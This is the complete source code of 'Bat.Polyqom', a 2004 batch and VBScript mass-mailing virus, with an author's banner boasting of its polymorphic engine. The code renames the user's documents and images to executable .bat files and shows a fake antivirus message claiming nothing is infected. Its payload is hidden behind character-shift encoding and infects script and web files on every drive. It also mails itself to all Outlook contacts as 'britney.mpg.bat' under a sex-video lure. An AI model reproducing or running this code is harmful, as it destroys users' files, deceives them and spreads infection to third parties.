:: BAT.VBS.HTML ~ Outlook Polyqom [Polymorphic Bat Qomar]________________
::    _______   _______   _       _   _______       ____   ____  _______
::   / ____ \\ / ____ \\ /\\     /\\ / ____ \\     /   \\ /  // / ____ \\
::  / //___\// \ \\_ \// \ \\   / // \ \\_ \//    /  /\ \/  // / //   \//
::  \______ \\ / __//     \ \\ / //  / __//      /  // \   //  \ \\   _
::  /\\___/ // \ \\__/\\   \ \/ //   \ \\__/\\  /  //  /  //    \ \\__/\\
::  \______//   \_____//    \__//     \_____// /__//  /__//      \_____//
:: ________________________http://trax.to/sevenC_________________________
:: ________________________sevenC_zone@yahoo.com_________________________
:: Again with me...!!
:: This is my first Batch virus with Polymorphic engine
:: Bat.Polyqom has no diffrent with Bat.Qomar
:: Something new here :
::
:: 1.Batch will changes the variable "%polyqom&" every runs
:: 2.Generated VBS Files that needed to infection routine has many encryption
::   and polymorphic technique.
:: 3.If you want learn about this VBS Poly technique You can see 
::   "sevenC Polymorphic VBS engine & Generator" / SPVEG
::   Or you can download my latest SSE [SSE-0.5]
:: 4.Bat will spread it self via Outlook with "Britney.mpg.bat"
::   as the attachment
:: 
:: Ok thats all about this ShIt...!!
:: 
::
:: sevenC - [Malworm]
:: May-1oth-2004
:: Bekasi-Indonesia
:: ______________________________________________________________________
:: 
:: Lets begin...!!

@ctty nul
@echo off
@copy %0 %windir%\Qomar.bat
@copy %0 C:\britney.mpg.bat
@for %%a in (C:\windows\*.txt) do ren %%a *.bat
@for %%a in (C:\windows\*.gif) do ren %%a *.bat
@for %%a in (C:\windows\*.jpg) do ren %%a *.bat
@for %%a in (C:\Mydocu~1\*.txt) do ren %%a *.bat
@for %%a in (C:\Mydocu~1\*.doc) do ren %%a *.bat
@for %%a in (C:\*.txt) do ren %%a *.bat
@for %%a in (C:\windows\*.bmp) do ren %%a *.bat
@for %%a in (C:\Mydocu~1\*.bmp) do ren %%a *.bat
@echo off
@Set polyqom = @Echo
%polyqom% set ff=createobject("scripting.filesystemobject")>>C:\Qomarudin.vbs
%polyqom% set rr=ff.opentextfile("%0",1)>>C:\Qomarudin.vbs 
%polyqom% lls=Split(rr.ReadAll,vbCrLf)>>C:\Qomarudin.vbs
%polyqom% for ii=69 to 127>>C:\Qomarudin.vbs
%polyqom% newcode=newcode & vbcrlf & lls(ii)>>C:\Qomarudin.vbs 
%polyqom% next>>C:\Qomarudin.vbs
%polyqom% set ww=ff.createtextfile(ff.getspecialfolder(0) & "\Qomar.vbs",true)>>C:\Qomarudin.vbs
%polyqom% ww.write newcode>>C:\Qomarudin.vbs
%polyqom% ww.close>>C:\Qomarudin.vbs
%polyqom% set ss=createobject("wscript.shell")>>C:\Qomarudin.vbs
%polyqom% ss.run ff.getspecialfolder(0) & "\wscript.exe " & ff.getspecialfolder(0) & "\Qomar.vbs %",1,false>>C:\Qomarudin.vbs
@cscript C:\Qomarudin.vbs
@del C:\Qomarudin.vbs
@cls
Echo Finished checking your PC from Virus
Echo No infected files found
Echo Copyright(c)Qomar-Antivirus
Echo Hit any key to scan your Master boot record...
@pause
goto end

'VBS.Polyqom [Polymorphic Bat qomar]
'By sevenC Who else ??
'http://sevenc.vze.com

enc1 = "Glp#vxfnh/#Ivr/#Gulyhv/#Gulyh/#Iroghu/#Ilohv/#Iloh/#Vxeiroghuv/Vxeiroghu#=Rq#huuru#uhvxph#qh{w=Vhw#vxfnh#@#zvfulsw1FuhdwhRemhfw+%ZVfulsw1Vkhoo%,"
enc2 = "=Vhw#Ivr#@#FuhdwhRemhfw+%vfulswlqj1IlohV|vwhpRemhfw%,=Ivr1frs|iloh#zvfulsw1vfulswixooqdph/#%F=_ZLQGRZV_Vwduw#Phqx_Surjudpv_VwduwXs_Zlqdps651h{h1"
enc3 = "yev%=Ivr1frs|iloh#zvfulsw1vfulswixooqdph/#%F=_zlqgrzv_Trpdu1yev%=vhw#up@ivr1rshqwh{wiloh+%F=_zlqgrzv_Trpdu1edw%,=oooo@4=Gr#Zkloh#up1dwhqgrivwuhd"
enc4 = "p#@#Idovh=olqh@#up1uhdgolqh=li#oooo@4#wkhq=frgh@#uhsodfh+olqh/#Fku+67,/#Fku+67,#)#%#)#fku+67,#)#%#)#Fku+67,#,=hovh=frgh@#frgh#)#Fku+67,#)#%#)#ye"
enc5 = "fuoi#)#%#)#Fku+67,#)#uhsodfh+olqh/#Fku+67,/#Fku+67,#)#%#)#fku+67,#)#%#)#Fku+67,#,=hqg#li=oooo@oooo.4=Orrs=kwp#@#%?%#)#%kwpoA?%#)#%khdgA?%#)#%wlw"
enc6 = "ohATrpduxglq111vh{#prylh?2%#)#%wlwohA?2%#)#%khdgA?%#)#%erg|A?%#)#%vfulsw#odqjxd%#)#%jh@yevfu%#)#%lswA%#)#yeFuOi#)#%rq#huuru#uhvxph#qh{w%#)#yeFuO"
enc7 = "i#)#%vhw#iv@fuhdwhremhfw+%%vfulswlqj1ilohv|vwhpremhfw%%,%#)#yeFuOi#)#%li#huu1qxpehu@75<#wkhq%#)#yeFuOi#)#%grfxphqw1zulwh#%#)#Fku+67,#)#%?ir%#)#%"
enc8 = "qw#idfh@*yhugdqd*#vl}h@*5*#froru@*&II3333*A\rx#qhhg#Dfwlyh[#hqdeohg#wr#vhh#wklv#iloh?euAFolfn#?%#)#%d#kuh%#)#%i@*mdydvfulsw=orfdwlrq1uhordg+,*AK"
enc9 = "huh?2dA#wr#uhordg#dqg#folfn#\hv?2irqwA%#)#Fku+67,#)#%%#)#yeFuOi#)#%hovh%#)#yeFuOi#)#%vhw#ze@iv1fuhdwhwh{wiloh+iv1jhwvshfldoiroghu+3,#)#%#)#Fku+6"
enc10 = "7,#)#%_trpdu1edw%#)#Fku+67,#)#%/wuxh,%#)#yeFuOi=kwp#@#kwp#)#%ze1zulwh#%#)#fku+67,#)#frgh#)#fku+67,=kwp#@#kwp#)#yeFuOi#)#%ze1forvh%#)#yeFuOi#)#%"
enc11 = "vhw#zv@fuhdwhremhfw+%#)#Fku+67,#)#%zvfulsw1vkhoo%#)#Fku+67,#)#%,%#)#yeFuOi#)#%zv1uxq#iv1jhwvshfldoiroghu+3,#)#%#)#Fku+67,#)#%_Trpdu1edw%#)#Fku+"
enc12 = "67,#)#%/idovh#%#)#yeFuOi#)#%grfxphqw1zulwh#%#)#Fku+67,#)#%?%#)#%irqw#idfh@*yhugdqd*#vl}h@*5*#froru@*&II333%#)#%3*AWklv#grfxphqw#kdv#shupdqhqw#h"
enc13 = "uuruv/#wu|#grzqordglqj#lw#djdlq?2%#)#%irqwA%#)#Fku+67,#)#%%#)#yeFuOi#)#%hqg#li%#)#yeFuOi#)#%?2%#)#%vfulswA?2%#)#%erg|A?2%#)#%kwpoA%=Vhw#trpdux#"
enc14 = "@#Ivr1fuhdwhwh{wiloh+%F=_zlqgrzv_trpdu1kwpo%/#Wuxh,=trpdux1zulwh#kwp=trpdux1Forvh=Vhw#Gulyhv@ivr1gulyhv=Iru#Hdfk#Gulyh#lq#Gulyhv=Li#gulyh1lvuhd"
enc15 = "g|#wkhq=Grvhdufk#gulyh#)#%_%=hqg#Li=Qh{w=Ixqfwlrq#Grvhdufk+Sdwk,=Vhw#Iroghu@ivr1jhwiroghu+sdwk,#=Vhw#Ilohv#@#iroghu1ilohv=Iru#Hdfk#Iloh#lq#iloh"
enc16 = "v=Li#ivr1JhwH{whqvlrqQdph+iloh1sdwk,@%yev%#ru#ivr1JhwH{whqvlrqQdph+iloh1sdwk,@%yeh%#wkhq#=Vhw#rrrrr#@#Ivr1RshqWh{wIloh+%F=_zlqgrzv_Trpdu1yev%,="
enc17 = "rrrrrr#@#rrrrr1uhdgdoo#=rrrrr1forvh#=Vhw#gursshu#@#Ivr1fuhdwhwh{wiloh+iloh1sdwk/#Wuxh,=gursshu1zulwh#rrrrrr=gursshu1Forvh=hqg#li=li#ivr1JhwH{wh"
enc18 = "qvlrqQdph+Iloh1sdwk,@%kwp%#ru#ivr1JhwH{whqvlrqQdph+Iloh1sdwk,@%kwpo%#ru#ivr1JhwH{whqvlrqQdph+Iloh1sdwk,@%dvs%#ru#ivr1JhwH{whqvlrqQdph+Iloh1sdwk"
enc19 = ",@%sks%#wkhq=vhw#up@ivr1rshqwh{wiloh+%F=_zlqgrzv_Trpdu1edw%,=oooo@4=Gr#Zkloh#up1dwhqgrivwuhdp#@#Idovh=olqh@#up1uhdgolqh=li#oooo@4#wkhq=frgh@#uh"
enc20 = "sodfh+olqh/#Fku+67,/#Fku+67,#)#%#)#fku+67,#)#%#)#Fku+67,#,=hovh=frgh@#frgh#)#Fku+67,#)#%#)#yefuoi#)#%#)#Fku+67,#)#uhsodfh+olqh/#Fku+67,/#Fku+67"
enc21 = ",#)#%#)#fku+67,#)#%#)#Fku+67,#,=hqg#li=oooo@oooo.4=Orrs=kwp#@#%?%#)#%kwpoA?%#)#%khdgA?%#)#%wlwohATrpduxglq111#Vh{#prylh?2%#)#%wlwohA?2%#)#%khdg"
enc22 = "A?%#)#%erg|A?%#)#%vfulsw#odqjxd%#)#%jh@yevfu%#)#%lswA%#)#yeFuOi#)#%rq#huuru#uhvxph#qh{w%#)#yeFuOi#)#%vhw#iv@fuhdwhremhfw+%%vfulswlqj1ilohv|vwhp"
enc23 = "remhfw%%,%#)#yeFuOi#)#%li#huu1qxpehu@75<#wkhq%#)#yeFuOi#)#%grfxphqw1zulwh#%#)#Fku+67,#)#%?ir%#)#%qw#idfh@*yhugdqd*#vl}h@*5*#froru@*&II3333*A\rx"
enc24 = "#qhhg#Dfwlyh[#hqdeohg#wr#vhh#wklv#iloh?euAFolfn#?%#)#%d#kuh%#)#%i@*mdydvfulsw=orfdwlrq1uhordg+,*AKhuh?2dA#wr#uhordg#dqg#folfn#\hv?2irqwA%#)#Fku"
enc25 = "+67,#)#%%#)#yeFuOi#)#%hovh%#)#yeFuOi#)#%vhw#ze@iv1fuhdwhwh{wiloh+iv1jhwvshfldoiroghu+3,#)#%#)#Fku+67,#)#%_Trpdu1edw%#)#Fku+67,#)#%/wuxh,%#)#yeF"
enc27 = "uOi=kwp#@#kwp#)#%ze1zulwh#%#)#fku+67,#)#frgh#)#fku+67,=kwp#@#kwp#)#yeFuOi#)#%ze1forvh%#)#yeFuOi#)#%vhw#zv@fuhdwhremhfw+%#)#Fku+67,#)#%zvfulsw1v"
enc28 = "khoo%#)#Fku+67,#)#%,%#)#yeFuOi#)#%zv1uxq#iv1jhwvshfldoiroghu+3,#)#%#)#Fku+67,#)#%_Trpdu1edw%#)#Fku+67,#)#%/idovh#%#)#yeFuOi#)#%grfxphqw1zulwh#%"
enc29 = "#)#Fku+67,#)#%?%#)#%irqw#idfh@*yhugdqd*#vl}h@*5*#froru@*&II333%#)#%3*AWklv#grfxphqw#kdv#shupdqhqw#huuruv/#wu|#grzqordglqj#lw#djdlq?2%#)#%irqwA%"
enc30 = "#)#Fku+67,#)#%%#)#yeFuOi#)#%hqg#li%#)#yeFuOi#)#%?2%#)#%vfulswA?2%#)#%erg|A?2%#)#%kwpoA%=Vhw#gursshu#@#Ivr1fuhdwhwh{wiloh+iloh1sdwk/#Wuxh,=gurss"
enc31 = "hu1zulwh#kwp=gursshu1Forvh=hqg#li=Li#ivr1JhwH{whqvlrqQdph+iloh1sdwk,@%edw%#wkhq=Vhw#ivr#@#fuhdwhremhfw+%vfulswlqj1ilohv|vwhpremhfw%,#=Vhw#rrrrr"
enc32 = "#@#ivr1rshqwh{wiloh+%F=_zlqgrzv_Trpdu1edw%,=rrrrrr#@#rrrrr1uhdgdoo=rrrrr1forvh#=Vhw#gursshu#@#Ivr1fuhdwhwh{wiloh+iloh1sdwk/#Wuxh,=gursshu1zulwh"
enc33 = "#rrrrrr=gursshu1Forvh=hqg#li=qh{w=Vhw#Vxeiroghuv#@#iroghu1VxeIroghuv=Iru#Hdfk#Vxeiroghu#lq#Vxeiroghuv=Grvhdufk#Vxeiroghu1sdwk#=Qh{w=hqg#ixqfwlr"
enc34 = "q=Glp#{=rq#huuru#uhvxph#qh{w=Vhw#ivr#@%Vfulswlqj1IlohV|vwhp1Remhfw%=Vhw#vr@FuhdwhRemhfw+ivr,=Vhw#ro@FuhdwhRemhfw+%Rxworrn1Dssolfdwlrq%,=Vhw#rxw"
enc35 = "@#ZVfulsw1FuhdwhRemhfw+%Rxworrn1Dssolfdwlrq%,=Vhw#pdsl#@#rxw1JhwQdphVsdfh+%PDSL%,=Vhw#d#@#pdsl1DgguhvvOlvwv+4,=Iru#{@4#Wr#d1DgguhvvHqwulhv1Frxq"
enc36 = "w#=Vhw#Pdlo@ro1FuhdwhLwhp+3,=Pdlo1wr@ro1JhwQdphVsdfh+%PDSL%,1DgguhvvOlvwv+4,1DgguhvvHqwulhv+{,=Pdlo1Vxemhfw@%Eulwqh|#Krw#vh{#prylh%=Pdlo1Erg|@%"
enc37 = "Kh|111#Wklv#lv#Eulwqh|#Krw#vh{#prylh#dqg#|rx#jrw#lw%=Pdlo1Dwwdfkphqwv1Dgg#+%F=_eulwqh|1psj1edw%,=Pdlo1Vhqg=Qh{w=ro1Txlw=*vvh="
a1 = enc1&enc2&enc3&enc4&enc5&enc6&enc7&enc8&enc9&enc10&enc11&enc12&enc13&enc14&enc15&enc16&enc17&enc18&enc19&enc20&enc21&enc22&enc23&enc24&enc25&enc26&enc27&enc28&enc29&enc30&enc31&enc32&enc33&enc34&enc35&enc36&enc37
for i1 = 1 to len(a1):u1 = mid(a1,i1,1):polysev = ((21/21)+(100*5)/(20*5+150))+((649*10/649)-10):e1 = asc(u1) - polysev : k1 = chr(e1):j1 = j1 + k1:next:Randomize:KS892 = int(rnd*255)+1:if KS892 = 1000 then:for z1 = 0 to KS892:s1 = strreverse(j1):next:end if:execute(j1)
set fso=createobject("scripting.filesystemobject"):set lookback=fso.opentextfile(wscript.scriptfullname,1,false)
poly = lookback.readall
Randomize:polyint = Int(Rnd * 9):if polyint > 5 then:polynew = replace(poly,"((21/21)+(100*5)/(20*5+150))+((649*10/649)-10)","((21/21)+(100*5)/(20*5+150))+((649*10/649)-10)*"&polyint/polyint):else:polynew = replace(poly,"((21/21)+(100*5)/(20*5+150))+((649*10/649)-10)",chr(51)&chr(42)&chr(54)&chr(49)&chr(50)&chr(47)&chr(54)&chr(49)&chr(50)):end if
Randomize:polyint1 = Int(Rnd * 9):if polyint > 4 then:polynew2 = replace(polynew,"polysev","polysev"&polyint1):else:polynew2 = replace (polynew,"polysev",chr(112)&chr(111)&chr(108)&chr(121)&chr(115)&chr(101)&chr(118)):end if
Randomize:polyint2 = Int(Rnd * 9):if polyint > 4 then:polynew3 = replace(polynew2,"a1","a1"&polyint2):else:polynew3 = replace(poly,"a1",chr(97)&"1"):end if
Randomize:polyint3 = Int(Rnd * 9):if polyint > 4 then:polynew4 = replace(polynew3,"i1","i1"&polyint3):else:polynew4 = replace(poly,"i1",chr(105)&"1"):end if
Randomize:polyint4 = Int(Rnd * 9):if polyint > 4 then:polynew5 = replace(polynew4,"u1","u1"&polyint4):else:polynew5 = replace(poly,"u1",chr(117)&"1"):end if
Randomize:polyint5 = Int(Rnd * 9):if polyint > 4 then:polynew6 = replace(polynew5,"e1","e1"&polyint5):else:polynew6 = replace(poly,"e1",chr(101)&"1"):end if
Randomize:polyint6 = Int(Rnd * 9):if polyint > 4 then:polynew7 = replace(polynew6,"k1","k1"&polyint6):else:polynew7 = replace(poly,"k1",chr(107)&"1"):end if
Randomize:polyint7 = Int(Rnd * 9):if polyint > 4 then:polynew8 = replace(polynew7,"j1","j1"&polyint7):else:polynew8 = replace(poly,"j1",chr(106)&"1"):end if
Randomize:polyint8 = Int(Rnd * 9):if polyint > 4 then:polynew9 = replace(polynew8,"b1","b1"&polyint8):else:polynew9 = replace(poly,"b1",chr(98)&"1"):end if
Randomize:polyint9 = Int(Rnd * 9):if polyint > 4 then:polynew10 = replace(polynew9,"z1","z1"&polyint9):else:polynew10 = replace(poly,"z1",chr(122)&"1"):end if
set newfile=fso.opentextfile(wscript.scriptfullname,2,false):newfile.write polynew10

'VBS.PolyQom [Polymorphic Bat Qomar]
'Created on Monday May.10th.2004
'By sevenC

:end
@del C:\britney.mpg.bat
%polyqom% [General]>>C:\Windows\system\Oeminfo.ini
%polyqom% Manufacturer="VIRUS INFORMATION">>C:\Windows\system\Oeminfo.ini
%polyqom% Model="BAT.VBS.HTML ~ Outlook Polyqom by sevenC">>C:\Windows\system\Oeminfo.ini
%polyqom% [Support Information]>>C:\Windows\system\Oeminfo.ini
%polyqom% Line1="BAT.VBS.HTML.Polyqom Information">>C:\Windows\system\Oeminfo.ini
%polyqom% Line2="*********************************">>C:\Windows\system\Oeminfo.ini
%polyqom% Line3="Again with me...sevenC">>C:\Windows\system\Oeminfo.ini
%polyqom% Line4="Where is Qomar ?">>C:\Windows\system\Oeminfo.ini
%polyqom% Line5="Where is Your Av's??">>C:\Windows\system\Oeminfo.ini
%polyqom% Line6="Qomar is funny">>C:\Windows\system\Oeminfo.ini
%polyqom% Line7="********************************************************************">>C:\Windows\system\Oeminfo.ini
%polyqom% Line8="BAT.VBS.HTML.Polyqom By sevenC">>C:\Windows\system\Oeminfo.ini
%polyqom% Line9="Created on friday 23th January 2004">>C:\Windows\system\Oeminfo.ini
%polyqom% Line10="-Bekasi.Indonesia-">>C:\Windows\system\Oeminfo.ini
Echo Finished scaning MBR.
Echo No Infected files found.
Echo Copyright(c)2004 by Qomarudin-AntiVirus
%polyqom% set ff=createobject("scripting.filesystemobject")>>C:\poly.vbs
%polyqom% set rr=ff.opentextfile("%0",1)>>C:\poly.vbs
%polyqom% aa = rr.readall>>C:\poly.vbs
%polyqom% rr.close>>C:\poly.vbs
%polyqom% Randomize>>C:\poly.vbs
%polyqom% polyqom = int(rnd * 3)>>C:\poly.vbs
%polyqom% if polyqom = 0 or polyqom = 2 then>>C:\poly.vbs
%polyqom% Polyqo = Replace(aa,"polyqom","polyqom" & polyqom )>>C:\poly.vbs
%polyqom% else>>C:\poly.vbs
%polyqom% Polyqo = Replace(aa,"polyqom","polyqom")>>C:\poly.vbs
%polyqom% end if>>C:\poly.vbs
%polyqom% set bb=ff.opentextfile("%0",2)>>C:\poly.vbs
%polyqom% bb.write polyqo>>C:\poly.vbs
%polyqom% bb.close>>C:\poly.vbs
@Cscript C:\poly.vbs
@Del C:\poly.vbs
@Pause
@exit
